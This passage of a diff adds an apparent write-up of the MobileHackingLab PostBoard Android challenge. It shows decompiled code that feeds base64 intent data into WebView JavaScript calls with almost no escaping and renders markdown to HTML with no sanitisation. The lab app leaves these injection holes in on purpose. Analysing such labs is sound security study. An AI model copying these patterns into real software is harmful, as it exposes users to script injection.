+</span></span><span style="display:flex;"><span>        String message <span style="color:#f92672">=</span> StringsKt.<span style="color:#a6e22e">replace$default</span>(<span style="color:#66d9ef">new</span> String(decode, Charsets.<span style="color:#a6e22e">UTF_8</span>), <span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;\\&#39;&#34;</span>, <span style="color:#66d9ef">false</span>, 4, (Object) <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        ActivityMainBinding activityMainBinding2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">binding</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (activityMainBinding2 <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>            Intrinsics.<span style="color:#a6e22e">throwUninitializedPropertyAccessException</span>(<span style="color:#e6db74">&#34;binding&#34;</span>);
+</span></span><span style="display:flex;"><span>            activityMainBinding2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        activityMainBinding2.<span style="color:#a6e22e">webView</span>.<span style="color:#a6e22e">loadUrl</span>(<span style="color:#e6db74">&#34;javascript:WebAppInterface.postMarkdownMessage(&#39;&#34;</span> <span style="color:#f92672">+</span> message <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;)&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>        ActivityMainBinding activityMainBinding3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">binding</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (activityMainBinding3 <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>            Intrinsics.<span style="color:#a6e22e">throwUninitializedPropertyAccessException</span>(<span style="color:#e6db74">&#34;binding&#34;</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            activityMainBinding <span style="color:#f92672">=</span> activityMainBinding3;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        activityMainBinding.<span style="color:#a6e22e">webView</span>.<span style="color:#a6e22e">loadUrl</span>(<span style="color:#e6db74">&#34;javascript:WebAppInterface.postCowsayMessage(&#39;&#34;</span> <span style="color:#f92672">+</span> e.<span style="color:#a6e22e">getMessage</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;)&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Moving on to the main activity code, there&rsquo;s a function for setting up WebView and it has JavaScript enabled. As for the <code>handleIntent</code> function, it basically accept intent and use the data as message after base64 decode and the message will be used in WebView while executing the JavaScript function <code>WebAppInterface.postMarkdownMessage</code>. If there&rsquo;s an error, it will instead execute the JavaScript function <code>WebAppInterface.postCowsayMessage</code>.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-18">18</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-19">19</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-20">20</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-21">21</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-22">22</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-23">23</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-24">24</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-25"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-25">25</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-26"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-26">26</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-27"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-27">27</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-28"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-28">28</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-29"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-29">29</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-30"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-30">30</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-31"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-31">31</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-32"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-32">32</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-33"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-33">33</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-34"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-34">34</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-35"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-35">35</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-36"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-36">36</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-37"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-37">37</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-38"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-38">38</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-39"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-39">39</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-40"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-40">40</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-41"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-41">41</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-42"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-42">42</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-43"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-43">43</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-44"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-44">44</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-45"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-45">45</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-46"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-46">46</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-47"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-47">47</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-48"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-48">48</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-49"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-49">49</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-50"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-50">50</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-51"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-51">51</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-52"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-52">52</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-53"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-53">53</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-54"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-54">54</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-55"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-55">55</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-56"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-56">56</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-57"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-57">57</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-58"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-58">58</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-59"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-59">59</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@JavascriptInterface</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">postMarkdownMessage</span>(String markdownMessage) {
+</span></span><span style="display:flex;"><span>    Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(markdownMessage, <span style="color:#e6db74">&#34;markdownMessage&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;```(.*?)```&#34;</span>, RegexOption.<span style="color:#a6e22e">DOT_MATCHES_ALL</span>).<span style="color:#a6e22e">replace</span>(markdownMessage, <span style="color:#e6db74">&#34;&lt;pre&gt;&lt;code&gt;$1&lt;/code&gt;&lt;/pre&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;`([^`]+)`&#34;</span>).<span style="color:#a6e22e">replace</span>(html, <span style="color:#e6db74">&#34;&lt;code&gt;$1&lt;/code&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;!\\[(.*?)\\]\\((.*?)\\)&#34;</span>).<span style="color:#a6e22e">replace</span>(html2, <span style="color:#e6db74">&#34;&lt;img src=&#39;$2&#39; alt=&#39;$1&#39;/&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;###### (.*)&#34;</span>).<span style="color:#a6e22e">replace</span>(html3, <span style="color:#e6db74">&#34;&lt;h6&gt;$1&lt;/h6&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html5 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;##### (.*)&#34;</span>).<span style="color:#a6e22e">replace</span>(html4, <span style="color:#e6db74">&#34;&lt;h5&gt;$1&lt;/h5&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html6 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;#### (.*)&#34;</span>).<span style="color:#a6e22e">replace</span>(html5, <span style="color:#e6db74">&#34;&lt;h4&gt;$1&lt;/h4&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html7 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;### (.*)&#34;</span>).<span style="color:#a6e22e">replace</span>(html6, <span style="color:#e6db74">&#34;&lt;h3&gt;$1&lt;/h3&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html8 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;## (.*)&#34;</span>).<span style="color:#a6e22e">replace</span>(html7, <span style="color:#e6db74">&#34;&lt;h2&gt;$1&lt;/h2&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html9 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;# (.*)&#34;</span>).<span style="color:#a6e22e">replace</span>(html8, <span style="color:#e6db74">&#34;&lt;h1&gt;$1&lt;/h1&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html10 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;\\*\\*(.*?)\\*\\*&#34;</span>).<span style="color:#a6e22e">replace</span>(html9, <span style="color:#e6db74">&#34;&lt;b&gt;$1&lt;/b&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html11 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;\\*(.*?)\\*&#34;</span>).<span style="color:#a6e22e">replace</span>(html10, <span style="color:#e6db74">&#34;&lt;i&gt;$1&lt;/i&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html12 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;~~(.*?)~~&#34;</span>).<span style="color:#a6e22e">replace</span>(html11, <span style="color:#e6db74">&#34;&lt;del&gt;$1&lt;/del&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html13 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;\\[([^\\[]+)\\]\\(([^)]+)\\)&#34;</span>).<span style="color:#a6e22e">replace</span>(html12, <span style="color:#e6db74">&#34;&lt;a href=&#39;$2&#39;&gt;$1&lt;/a&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    String html14 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;(?m)^(\\* .+)((\\n\\* .+)*)&#34;</span>).<span style="color:#a6e22e">replace</span>(html13, <span style="color:#66d9ef">new</span> Function1<span style="color:#f92672">&lt;</span>MatchResult, CharSequence<span style="color:#f92672">&gt;</span>() { <span style="color:#75715e">// from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// kotlin.jvm.functions.Function1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> CharSequence <span style="color:#a6e22e">invoke</span>(MatchResult matchResult) {
+</span></span><span style="display:flex;"><span>            Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(matchResult, <span style="color:#e6db74">&#34;matchResult&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&lt;ul&gt;&#34;</span> <span style="color:#f92672">+</span> CollectionsKt.<span style="color:#a6e22e">joinToString$default</span>(StringsKt.<span style="color:#a6e22e">split$default</span>((CharSequence) matchResult.<span style="color:#a6e22e">getValue</span>(), <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;\n&#34;</span>}, <span style="color:#66d9ef">false</span>, 0, 6, (Object) <span style="color:#66d9ef">null</span>), <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>, 0, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> Function1<span style="color:#f92672">&lt;</span>String, CharSequence<span style="color:#f92672">&gt;</span>() { <span style="color:#75715e">// from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$1.1</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// kotlin.jvm.functions.Function1</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> CharSequence <span style="color:#a6e22e">invoke</span>(String it) {
+</span></span><span style="display:flex;"><span>                    Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(it, <span style="color:#e6db74">&#34;it&#34;</span>);
+</span></span><span style="display:flex;"><span>                    StringBuilder append <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder().<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;&lt;li&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>                    String substring <span style="color:#f92672">=</span> it.<span style="color:#a6e22e">substring</span>(2);
+</span></span><span style="display:flex;"><span>                    Intrinsics.<span style="color:#a6e22e">checkNotNullExpressionValue</span>(substring, <span style="color:#e6db74">&#34;this as java.lang.String).substring(startIndex)&#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> append.<span style="color:#a6e22e">append</span>(substring).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;&lt;/li&gt;&#34;</span>).<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }, 30, <span style="color:#66d9ef">null</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/ul&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    String html15 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;(?m)^\\d+\\. .+((\\n\\d+\\. .+)*)&#34;</span>).<span style="color:#a6e22e">replace</span>(html14, <span style="color:#66d9ef">new</span> Function1<span style="color:#f92672">&lt;</span>MatchResult, CharSequence<span style="color:#f92672">&gt;</span>() { <span style="color:#75715e">// from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$2</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// kotlin.jvm.functions.Function1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> CharSequence <span style="color:#a6e22e">invoke</span>(MatchResult matchResult) {
+</span></span><span style="display:flex;"><span>            Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(matchResult, <span style="color:#e6db74">&#34;matchResult&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&lt;ol&gt;&#34;</span> <span style="color:#f92672">+</span> CollectionsKt.<span style="color:#a6e22e">joinToString$default</span>(StringsKt.<span style="color:#a6e22e">split$default</span>((CharSequence) matchResult.<span style="color:#a6e22e">getValue</span>(), <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;\n&#34;</span>}, <span style="color:#66d9ef">false</span>, 0, 6, (Object) <span style="color:#66d9ef">null</span>), <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>, 0, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> Function1<span style="color:#f92672">&lt;</span>String, CharSequence<span style="color:#f92672">&gt;</span>() { <span style="color:#75715e">// from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$2.1</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// kotlin.jvm.functions.Function1</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> CharSequence <span style="color:#a6e22e">invoke</span>(String it) {
+</span></span><span style="display:flex;"><span>                    Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(it, <span style="color:#e6db74">&#34;it&#34;</span>);
+</span></span><span style="display:flex;"><span>                    StringBuilder append <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder().<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;&lt;li&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>                    String substring <span style="color:#f92672">=</span> it.<span style="color:#a6e22e">substring</span>(StringsKt.<span style="color:#a6e22e">indexOf$default</span>((CharSequence) it, <span style="color:#e6db74">&#39;.&#39;</span>, 0, <span style="color:#66d9ef">false</span>, 6, (Object) <span style="color:#66d9ef">null</span>) <span style="color:#f92672">+</span> 2);
+</span></span><span style="display:flex;"><span>                    Intrinsics.<span style="color:#a6e22e">checkNotNullExpressionValue</span>(substring, <span style="color:#e6db74">&#34;this as java.lang.String).substring(startIndex)&#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> append.<span style="color:#a6e22e">append</span>(substring).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;&lt;/li&gt;&#34;</span>).<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }, 30, <span style="color:#66d9ef">null</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/ol&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    String html16 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Regex(<span style="color:#e6db74">&#34;^&gt; (.*)&#34;</span>, RegexOption.<span style="color:#a6e22e">MULTILINE</span>).<span style="color:#a6e22e">replace</span>(html15, <span style="color:#e6db74">&#34;&lt;blockquote&gt;$1&lt;/blockquote&gt;&#34;</span>);
